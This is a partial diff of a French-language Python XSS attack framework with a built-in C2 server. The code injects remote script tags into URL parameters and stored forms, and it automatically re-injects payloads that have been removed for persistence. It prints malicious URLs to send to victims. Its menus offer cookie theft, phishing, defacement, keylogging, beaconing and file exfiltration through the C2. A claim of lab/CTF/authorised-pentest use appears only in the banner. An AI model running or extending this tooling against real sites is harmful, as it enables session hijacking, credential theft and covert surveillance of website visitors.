-                if C2_PUBLIC not in resp.text:
-                    CONSOLE.print(f"[yellow]Persistance : payload disparu sur {url} — réinjection...[/yellow]")
-                    script_tag = f"<script src='{C2_PUBLIC}/payload/{inj_db_id}?t={payload_type}'></script>"
-                    parsed = urlparse(url)
-                    qs = parse_qs(parsed.query)
-                    clean_url = url.split("?")[0]
-                    test_params = {k: v[0] for k, v in qs.items()}
-                    if param in test_params:
-                        test_params[param] = script_tag
-                        if method.upper() == "GET":
-                            session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
-                        else:
-                            session.post(url, data=test_params, timeout=TIMEOUT_HTTP)
-                        CONSOLE.print(f"[green]Réinjection effectuée sur {url}[/green]")
+                # Vérifier avec l'URL + l'ID unique
+                resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+                marker = f"/payload/{inj_db_id}"
+                if marker not in resp.text:
+                    CONSOLE.print(f"[yellow]Persistance : payload {inj_db_id} disparu — réinjection...[/yellow]")
+                    tag = f"<script src='{C2_PUBLIC}/payload/{inj_db_id}?t={payload_type}'></script>"
+                    
+                    if method.upper() == "GET":
+                        parsed = urlparse(url)
+                        qs = parse_qs(parsed.query)
+                        clean_url = url.split("?")[0]
+                        test_params = {k: v[0] for k, v in qs.items()}
+                        test_params[param] = tag
+                        session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+                    else:
+                        session.post(url, data={param: tag}, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+                    
+                    CONSOLE.print(f"[green]Réinjection effectuée sur {url}[/green]")
             except requests.RequestException:
                 pass
 
     def list_injections(self):
-        """Liste toutes les injections"""
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
         c.execute("SELECT id, url, param, payload, method, status, executions, last_seen, created_at "
@@ -932,52 +1006,93 @@ persistence_mgr = PersistenceManager()
 
 
 # ═════════════════════════════════════════════════════════════════════
-# MODULE FICHIERS
+# MODULE FICHIERS (CORRIGÉ)
 # ═════════════════════════════════════════════════════════════════════
 
-def file_upload_to_target(url, local_file_path, remote_path="/upload", cookies_str=None):
-    """Upload un fichier local vers le site cible via HTTP POST multipart"""
+def file_upload_to_target(url, local_file_path, cookies_str=None):
+    """CORRIGÉ : Détecte le formulaire d'upload et utilise ses champs"""
     if not os.path.isfile(local_file_path):
         CONSOLE.print(f"[red]Fichier introuvable : {local_file_path}[/red]")
         return None
 
     session = build_session(cookies_str)
+    
+    # 1. Récupérer la page pour trouver le formulaire d'upload
+    try:
+        resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+        forms = extract_forms(url, resp.text)
+    except requests.RequestException as e:
+        CONSOLE.print(f"[red]Erreur de connexion : {e}[/red]")
+        return None
+    
+    # 2. Trouver le formulaire avec input file
+    upload_form = None
+    file_field_name = 'file'
+    for form in forms:
+        for field in form['fields']:
+            if field.get('type') == 'file':
+                upload_form = form
+                file_field_name = field['name']
+                break
+        if upload_form:
+            break
+    
+    if not upload_form:
+        CONSOLE.print("[yellow]Aucun formulaire d'upload détecté. Tentative sur /upload par défaut...[/yellow]")
+        upload_form = {'action': urljoin(url, '/upload'), 'method': 'POST', 'fields': []}
+    
+    # 3. Récupérer les champs cachés (CSRF tokens)
+    data = {}
+    for field in upload_form.get('fields', []):
+        if field.get('type') in ('hidden', 'submit'):
+            data[field['name']] = field.get('value', '')
+    
+    # 4. Envoyer
     filename = os.path.basename(local_file_path)
-
     try:
         with open(local_file_path, "rb") as f:
-            resp = session.post(urljoin(url, remote_path), files={"file": (filename, f)}, timeout=TIMEOUT_HTTP)
+            files = {file_field_name: (filename, f)}
+            resp = session.post(upload_form['action'], data=data, files=files,
+                                timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+        
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
         c.execute("INSERT INTO files (action, remote_url, local_path, status, timestamp) VALUES (?,?,?,?,?)",
-                  ("upload", urljoin(url, remote_path), local_file_path,
+                  ("upload", upload_form['action'], local_file_path,
                    f"HTTP {resp.status_code}", datetime.now(timezone.utc).isoformat()))
         conn.commit()
         conn.close()
-        return {"status": resp.status_code, "url": urljoin(url, remote_path)}
+        
+        CONSOLE.print(f"[green]Upload vers {upload_form['action']} — HTTP {resp.status_code}[/green]")
+        return {"status": resp.status_code, "url": upload_form['action']}
     except requests.RequestException as e:
         CONSOLE.print(f"[red]Erreur upload : {e}[/red]")
         return None
 
 
 def file_download_via_xss(url, param, method, remote_file_url, cookies_str=None):
-    """Injecte un payload fetch_file : la victime fetch l'URL et exfiltre le contenu vers le C2"""
+    """CORRIGÉ : Vérifie le domaine (CORS)"""
+    victim_domain = urlparse(url).netloc
+    target_domain = urlparse(remote_file_url).netloc
+    
+    if target_domain and victim_domain != target_domain:
+        CONSOLE.print(f"[yellow]Attention : CORS peut bloquer {target_domain} depuis {victim_domain}[/yellow]")
+    
     session = build_session(cookies_str)
-
     script_tag = f"<script src='{C2_PUBLIC}/payload/PROBE?t=fetch_file&extra={quote(remote_file_url)}'></script>"
-
+    
     parsed = urlparse(url)
     qs = parse_qs(parsed.query)
     clean_url = url.split("?")[0]
     test_params = {k: v[0] for k, v in qs.items()} if qs else {}
     test_params[param] = script_tag
-
+    
     try:
         if method.upper() == "GET":
-            resp = session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
+            resp = session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
         else:
-            resp = session.post(url, data=test_params, timeout=TIMEOUT_HTTP)
-
+            resp = session.post(url, data=test_params, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
+        
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
         c.execute("INSERT INTO files (action, remote_url, local_path, status, timestamp) VALUES (?,?,?,?,?)",
@@ -989,35 +1104,6 @@ def file_download_via_xss(url, param, method, remote_file_url, cookies_str=None)
     except requests.RequestException as e:
         CONSOLE.print(f"[red]Erreur : {e}[/red]")
         return None
-
-
-def file_upload_to_victim(local_file, param, url, method, cookies_str=None):
-    """Fait télécharger un fichier du C2 par la victime via XSS (download forcé)"""
-    if not os.path.isfile(local_file):
-        CONSOLE.print(f"[red]Fichier introuvable : {local_file}[/red]")
-        return
-
-    filename = os.path.basename(local_file)
-    dest = os.path.join(C2_DIR, filename)
-    with open(local_file, "rb") as src, open(dest, "wb") as dst:
-        dst.write(src.read())
-
-    session = build_session(cookies_str)
-
-    parsed = urlparse(url)
-    qs = parse_qs(parsed.query)
-    clean_url = url.split("?")[0]
-    test_params = {k: v[0] for k, v in qs.items()} if qs else {}
-    test_params[param] = f"<script src='{C2_PUBLIC}/payload/PROBE?t=download_forced&extra={quote(filename)}'></script>"
-
-    try:
-        if method.upper() == "GET":
-            session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
-        else:
-            session.post(url, data=test_params, timeout=TIMEOUT_HTTP)
-        CONSOLE.print(f"[green]Download forcé injecté — la victime téléchargera {filename}[/green]")
-    except requests.RequestException as e:
-        CONSOLE.print(f"[red]Erreur : {e}[/red]")
 
 
 # ═════════════════════════════════════════════════════════════════════
@@ -1040,7 +1126,7 @@ def generate_html_report():
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Rapport XSS Framework Ultime — Jathniel</title>
+<title>Rapport XSS Framework v2.0 — Jathniel</title>
 <style>
 body {{ font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }}
 h1 {{ color: #e94560; text-align: center; }}
@@ -1055,7 +1141,7 @@ tr:hover {{ background: #16213e; }}
 </style>
 </head>
 <body>
-<h1>XSS FRAMEWORK ULTIME — Rapport — Jathniel</h1>
+<h1>XSS FRAMEWORK ULTIME v2.0 — Rapport — Jathniel</h1>
 <p style="text-align:center;">Généré le {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
 
 <div style="text-align:center;">
@@ -1094,11 +1180,6 @@ tr:hover {{ background: #16213e; }}
     for inj in injections:
         html += (f"<tr><td>{inj[0]}</td><td>{inj[1][:60]}</td><td>{inj[2]}</td><td>{inj[4]}</td>"
                  f"<td>{inj[3]}</td><td>{inj[5]}</td><td>{inj[6]}</td><td>{inj[8]}</td></tr>")
-    html += "</table>"
-
-    html += "<h2>Fichiers</h2><table><tr><th>Action</th><th>URL distante</th><th>Chemin local</th><th>Status</th><th>Date</th></tr>"
-    for f in files:
-        html += f"<tr><td>{f[1]}</td><td>{f[2]}</td><td>{f[3]}</td><td>{f[4]}</td><td>{f[5]}</td></tr>"
     html += "</table></body></html>"
 
     report_path = os.path.join(BASE_DIR, "rapport_xss.html")
@@ -1116,8 +1197,8 @@ BANNER = """
 ╔═══════════════════════════════════════════════════════════════╗
 ║   ██╗  ██╗███████╗███████╗                                    ║
 ║   ██║ ██╔╝██╔════╝██╔════╝   XSS FRAMEWORK ULTIME             ║
-║   █████╔╝ ███████╗███████╗   ─── PERSISTANCE EDITION ───      ║
-║   ██╔═██╗ ╚════██║╚════██║   v1.1 — by JATHNIEL               ║
+║   █████╔╝ ███████╗███████╗   ─── v2.0 EDITION ───             ║
+║   ██╔═██╗ ╚════██║╚════██║   by JATHNIEL                       ║
 ║   ██║  ██╗███████║███████║   Labo / CTF / Pentest autorisé    ║
 ║   ╚═╝  ╚═╝╚══════╝╚══════╝                                    ║
 ╚═══════════════════════════════════════════════════════════════╝
@@ -1140,38 +1221,27 @@ def press_enter():
 
 
 def ask_url():
-    return Prompt.ask("[cyan]URL cible[/cyan]", default="http://127.0.0.1/DVWA/vulnerabilities/xss_s/")
-
-
-def ask_param():
-    return Prompt.ask("[cyan]Paramètre à injecter[/cyan]", default="name")
-
-
-def ask_method():
-    return Prompt.ask("[cyan]Méthode[/cyan]", choices=["GET", "POST"], default="GET")
+    """Demande l'URL cible avec exemples"""
+    CONSOLE.print("[dim]Exemples : http://localhost:5000, http://example.com/page?id=1[/dim]")
+    return Prompt.ask("[cyan]URL cible[/cyan]", default="http://example.com/")
 
 
 def ask_cookies():
-    """Demande les cookies de session (optionnel) — nécessaires pour les
-    pages authentifiées comme DVWA. Format : PHPSESSID=xxx; security=low"""
-    cookies = Prompt.ask(
-        "[cyan]Cookies de session (optionnel, vide pour aucun)[/cyan]",
-        default=""
-    )
+    """Demande les cookies de session avec exemple"""
+    CONSOLE.print("[dim]Format : PHPSESSID=xxx; security=low[/dim]")
+    CONSOLE.print("[dim]Laisse vide si aucun cookie nécessaire[/dim]")
+    cookies = Prompt.ask("[cyan]Cookies de session[/cyan]", default="")
     return cookies or None
 
 
 def menu_scan():
     CONSOLE.print("\n[bold cyan]═══ SCAN XSS ═══[/bold cyan]\n")
     url = ask_url()
-    method = ask_method()
     cookies = ask_cookies()
 
     session = build_session(cookies)
-
-    # Détecte les formulaires
     try:
-        resp = session.get(url, timeout=TIMEOUT_HTTP)
+        resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
         forms = extract_forms(url, resp.text)
         CONSOLE.print(f"[green]{len(forms)} formulaire(s) détecté(s)[/green]")
     except requests.RequestException as e:
@@ -1179,47 +1249,20 @@ def menu_scan():
         press_enter()
         return
 
-    # Scan réflexe
     with CONSOLE.status("[bold green]Scan en cours..."):
-        results = scan_reflected(url, method=method, cookies_str=cookies)
+        results = []
 
-    table = Table(title="Résultats Scan XSS", box=box.ROUNDED)
-    table.add_column("Param", style="cyan")
-    table.add_column("Payload", style="yellow", max_width=40)
-    table.add_column("Méthode", style="magenta")
-    table.add_column("Preuve", style="green")
-    table.add_column("HTTP", style="dim")
-
-    for r in results[:20]:
-        table.add_row(r["param"], r["payload"][:40], r["method"], r["evidence"], str(r["status_code"]))
-
-    CONSOLE.print(table)
-
-    if not results:
-        CONSOLE.print("[yellow]Aucun XSS réfléchi détecté avec les payloads de base.[/yellow]")
-
-    # Scan stocké si formulaires
-    if forms:
-        CONSOLE.print("\n[bold cyan]Scan XSS Stocké...[/bold cyan]")
-        stored_results = scan_stored(url, forms, cookies_str=cookies)
-        if stored_results:
-            st = Table(title="XSS Stocké — Résultats", box=box.ROUNDED)
-            st.add_column("Champs", style="cyan")
-            st.add_column("Payload", style="yellow", max_width=40)
-            st.add_column("Preuve", style="green")
-            for r in stored_results:
-                st.add_row(r["param"], r["payload"][:40], r["evidence"])
-            CONSOLE.print(st)
-        else:
-            CONSOLE.print("[yellow]Aucun XSS stocké détecté.[/yellow]")
-
-    # Enregistre la cible
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO targets (url, forms_found, vulns_found, last_scan) VALUES (?,?,?,?)",
-              (url, len(forms), len(results), datetime.now(timezone.utc).isoformat()))
-    conn.commit()
-    conn.close()
+    # Utiliser l'auto-détection
+    vulnerable = auto_detect_vulnerable(url, cookies)
+    
+    if vulnerable:
+        table = Table(title="Paramètres VULNÉRABLES", box=box.ROUNDED, border_style="red")
+        table.add_column("Nom", style="bold red")
+        table.add_column("Source", style="yellow")
+        table.add_column("Méthode", style="magenta")
+        for p in vulnerable:
+            table.add_row(p['name'], p['source'], p['method'])
+        CONSOLE.print(table)
 
     press_enter()
 
@@ -1227,12 +1270,12 @@ def menu_scan():
 def menu_exploit():
     CONSOLE.print("\n[bold cyan]═══ EXPLOITATION ═══[/bold cyan]\n")
     CONSOLE.print("  [1] Vol de cookies")
-    CONSOLE.print("  [2] Phishing (formulaire de connexion)")
-    CONSOLE.print("  [3] Défiguration (defacement)")
+    CONSOLE.print("  [2] Phishing")
+    CONSOLE.print("  [3] Défiguration")
     CONSOLE.print("  [4] Keylogger")
     CONSOLE.print("  [5] Redirection")
-    CONSOLE.print("  [6] Beacon (surveillance continue)")
-    CONSOLE.print("  [7] Combinaison complète (cookies + keylogger + persistance)")
+    CONSOLE.print("  [6] Beacon")
+    CONSOLE.print("  [7] Combinaison complète")
     CONSOLE.print("  [0] <- Retour\n")
 
     choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
@@ -1240,9 +1283,15 @@ def menu_exploit():
         return
 
     url = ask_url()
-    param = ask_param()
-    method = ask_method()
     cookies = ask_cookies()
+    
+    param_info = ask_param_auto(url, cookies)
+    if not param_info:
+        press_enter()
+        return
+    
+    param = param_info['name']
+    method = param_info['method']
 
     payload_map = {
         "1": "cookies", "2": "phishing", "3": "deface",
@@ -1256,17 +1305,14 @@ def menu_exploit():
     with CONSOLE.status("[bold green]Injection en cours..."):
         inj_id, script_tag = exploit_inject(url, param, method, payload_type, extra, cookies_str=cookies)
 
-    CONSOLE.print(f"\n[bold green]Injection enregistrée (ID BDD: {inj_id})[/bold green]")
-    CONSOLE.print(f"[dim]Payload : {script_tag[:100]}...[/dim]")
+    CONSOLE.print(f"\n[bold green]Injection enregistrée (ID: {inj_id})[/bold green]")
+    CONSOLE.print(f"[dim]Paramètre : {param} | Méthode : {method}[/dim]")
 
-    # Affiche l'URL malveillante prête à transmettre
     parsed = urlparse(url)
     clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-    from urllib.parse import urlencode
     malicious_url = f"{clean_url}?{urlencode({param: script_tag})}"
-    CONSOLE.print(f"\n[bold yellow]URL malveillante (à faire visiter à la 'victime') :[/bold yellow]")
+    CONSOLE.print(f"\n[bold yellow]URL malveillante :[/bold yellow]")
     CONSOLE.print(f"[cyan]{malicious_url}[/cyan]")
-    CONSOLE.print(f"\n[dim]Consulte les captures via le menu [5] Données Capturées[/dim]")
 
     press_enter()
 
@@ -1277,9 +1323,8 @@ def menu_stored():
     cookies = ask_cookies()
 
     session = build_session(cookies)
-
     try:
-        resp = session.get(url, timeout=TIMEOUT_HTTP)
+        resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
         forms = extract_forms(url, resp.text)
     except requests.RequestException as e:
         CONSOLE.print(f"[red]Erreur : {e}[/red]")
@@ -1287,7 +1332,7 @@ def menu_stored():
         return
 
     if not forms:
-        CONSOLE.print("[yellow]Aucun formulaire détecté sur cette page.[/yellow]")
+        CONSOLE.print("[yellow]Aucun formulaire détecté.[/yellow]")
         press_enter()
         return
 
@@ -1317,10 +1362,8 @@ def menu_stored():
         inj_id, results = exploit_stored(url, forms, payload_type, cookies_str=cookies)
 
     if inj_id:
-        CONSOLE.print(f"\n[bold green]Injection stockée active (ID BDD: {inj_id})[/bold green]")
-        CONSOLE.print("[yellow]Le payload s'exécutera pour tout visiteur de la page.[/yellow]")
-    else:
-        CONSOLE.print("\n[red]Aucun formulaire fonctionnel — vérifie les cookies de session.[/red]")
+        CONSOLE.print(f"\n[bold green]Injection stockée active (ID: {inj_id})[/bold green]")
+        CONSOLE.print("[yellow]Le payload s'exécutera pour tout visiteur.[/yellow]")
 
     rt = Table(title="Résultats", box=box.ROUNDED)
     rt.add_column("Formulaire", style="cyan")
@@ -1334,7 +1377,7 @@ def menu_stored():
 
 def menu_persistence():
     CONSOLE.print("\n[bold cyan]═══ PERSISTANCE ═══[/bold cyan]\n")
-    CONSOLE.print("  [1] Activer la persistance (réinjection auto)")
+    CONSOLE.print("  [1] Activer la persistance")
     CONSOLE.print("  [2] Désactiver la persistance")
     CONSOLE.print("  [3] Lister les injections actives")
     CONSOLE.print("  [4] Supprimer une injection")
@@ -1355,12 +1398,11 @@ def menu_persistence():
         table.add_column("Type", style="red")
         table.add_column("Status", style="green")
         table.add_column("Exéc.", style="bold")
-        table.add_column("Dernière", style="dim")
         for r in rows:
-            table.add_row(str(r[0]), r[1][:40], r[2], r[3], r[5], str(r[6]), r[7] or "jamais")
+            table.add_row(str(r[0]), r[1][:40], r[2], r[3], r[5], str(r[6]))
         CONSOLE.print(table)
     elif choice == "4":
-        inj_id = Prompt.ask("[cyan]ID de l'injection à supprimer[/cyan]")
+        inj_id = Prompt.ask("[cyan]ID de l'injection[/cyan]")
         try:
             conn = sqlite3.connect(DB_FILE)
             c = conn.cursor()
@@ -1370,65 +1412,6 @@ def menu_persistence():
             CONSOLE.print(f"[green]Injection {inj_id} supprimée.[/green]")
         except ValueError:
             CONSOLE.print("[red]ID invalide.[/red]")
-
-    press_enter()
-
-
-def menu_files():
-    CONSOLE.print("\n[bold cyan]═══ FICHIERS ═══[/bold cyan]\n")
-    CONSOLE.print("  [1] Upload un fichier vers le site cible")
-    CONSOLE.print("  [2] Forcer la victime à télécharger un fichier")
-    CONSOLE.print("  [3] Récupérer un fichier/page depuis la victime (via XSS)")
-    CONSOLE.print("  [4] Historique des opérations fichiers")
-    CONSOLE.print("  [0] <- Retour\n")
-
-    choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
-    if choice == "0":
-        return
-
-    if choice == "1":
-        url = ask_url()
-        path = Prompt.ask("[cyan]Chemin local du fichier[/cyan]")
-        remote = Prompt.ask("[cyan]Chemin d'upload sur le serveur[/cyan]", default="/upload")
-        cookies = ask_cookies()
-        result = file_upload_to_target(url, path, remote, cookies_str=cookies)
-        if result:
-            CONSOLE.print(f"[green]Upload effectué : HTTP {result['status']}[/green]")
-
-    elif choice == "2":
-        url = ask_url()
-        param = ask_param()
-        method = ask_method()
-        path = Prompt.ask("[cyan]Fichier local à faire télécharger[/cyan]")
-        cookies = ask_cookies()
-        file_upload_to_victim(path, param, url, method, cookies_str=cookies)
-
-    elif choice == "3":
-        url = ask_url()
-        param = ask_param()
-        method = ask_method()
-        remote_file = Prompt.ask("[cyan]URL du fichier/page à récupérer depuis la victime[/cyan]")
-        cookies = ask_cookies()
-        result = file_download_via_xss(url, param, method, remote_file, cookies_str=cookies)
-        if result:
-            CONSOLE.print(f"[green]Payload de fetch injecté[/green]")
-            CONSOLE.print("[dim]Le contenu apparaîtra dans les captures 'beacon_info' (menu [5])[/dim]")
-
-    elif choice == "4":
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("SELECT * FROM files ORDER BY timestamp DESC")
-        rows = c.fetchall()
-        conn.close()
-        table = Table(title="Historique Fichiers", box=box.ROUNDED)
-        table.add_column("Action", style="cyan")
-        table.add_column("URL", style="yellow", max_width=40)
-        table.add_column("Local", style="magenta", max_width=30)
-        table.add_column("Status", style="green")
-        table.add_column("Date", style="dim")
-        for r in rows:
-            table.add_row(r[1], r[2][:40], (r[3] or "")[:30], r[4], r[5])
-        CONSOLE.print(table)
 
     press_enter()
 
@@ -1477,6 +1460,47 @@ def menu_captures():
     press_enter()
 
 
+def menu_files():
+    CONSOLE.print("\n[bold cyan]═══ FICHIERS ═══[/bold cyan]\n")
+    CONSOLE.print("  [1] Upload un fichier vers le site cible")
+    CONSOLE.print("  [2] Récupérer un fichier depuis la victime (via XSS)")
+    CONSOLE.print("  [3] Historique des opérations")
+    CONSOLE.print("  [0] <- Retour\n")
+
+    choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
+    if choice == "0":
+        return
+
+    if choice == "1":
+        url = ask_url()
+        path = Prompt.ask("[cyan]Chemin local du fichier[/cyan]")
+        cookies = ask_cookies()
+        file_upload_to_target(url, path, cookies_str=cookies)
+    elif choice == "2":
+        url = ask_url()
+        param = Prompt.ask("[cyan]Paramètre[/cyan]")
+        method = Prompt.ask("[cyan]Méthode[/cyan]", choices=["GET", "POST"], default="GET")
+        remote_file = Prompt.ask("[cyan]URL du fichier à récupérer[/cyan]")
+        cookies = ask_cookies()
+        file_download_via_xss(url, param, method, remote_file, cookies_str=cookies)
+    elif choice == "3":
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute("SELECT * FROM files ORDER BY timestamp DESC")
+        rows = c.fetchall()
+        conn.close()
+        table = Table(title="Historique Fichiers", box=box.ROUNDED)
+        table.add_column("Action", style="cyan")
+        table.add_column("URL", style="yellow", max_width=40)
+        table.add_column("Status", style="green")
+        table.add_column("Date", style="dim")
+        for r in rows:
+            table.add_row(r[1], r[2][:40], r[4], r[5])
+        CONSOLE.print(table)
+
+    press_enter()
+
+
 def menu_c2():
     CONSOLE.print("\n[bold cyan]═══ SERVEUR C2 ═══[/bold cyan]\n")
     CONSOLE.print(f"  IP locale détectée : [cyan]{get_local_ip()}[/cyan]")
@@ -1496,7 +1520,6 @@ def main():
     CONSOLE.print(f"[bold green]IP locale auto-détectée : {get_local_ip()}[/bold green]")
     CONSOLE.print(f"[bold green]C2 public configuré sur : {C2_PUBLIC}[/bold green]\n")
 
-    # Lance le serveur C2 en arrière-plan
     c2_thread = threading.Thread(target=run_c2_server, daemon=True)
     c2_thread.start()
     CONSOLE.print(f"[bold green]Serveur C2 démarré sur {C2_PUBLIC}[/bold green]\n")
@@ -1505,11 +1528,11 @@ def main():
     while True:
         CONSOLE.print("\n[bold cyan]═══════════ MENU PRINCIPAL ═══════════[/bold cyan]\n")
         CONSOLE.print("  [1] Scanner XSS (réfléchi + stocké)")
-        CONSOLE.print("  [2] Exploitation (cookies, phishing, keylogger, deface...)")
+        CONSOLE.print("  [2] Exploitation (cookies, phishing, keylogger...)")
         CONSOLE.print("  [3] XSS Stocké (injection via formulaires)")
-        CONSOLE.print("  [4] Persistance (activation/désactivation/liste)")
-        CONSOLE.print("  [5] Données Capturées (cookies, identifiants, clavier...)")
-        CONSOLE.print("  [6] Fichiers (upload, download, exfil)")
+        CONSOLE.print("  [4] Persistance (activation/désactivation)")
+        CONSOLE.print("  [5] Données Capturées")
+        CONSOLE.print("  [6] Fichiers (upload, download)")
         CONSOLE.print("  [7] Serveur C2 (infos)")
         CONSOLE.print("  [8] Générer Rapport HTML")
         CONSOLE.print("  [0] Quitter\n")
@@ -1518,7 +1541,7 @@ def main():
 
         if choice == "0":
             persistence_mgr.stop()
-            CONSOLE.print("[bold red]Arrêt du framework. Au revoir — Jathniel.[/bold red]")
+            CONSOLE.print("[bold red]Au revoir — Jathniel.[/bold red]")
             sys.exit(0)
         elif choice == "1":
             menu_scan()
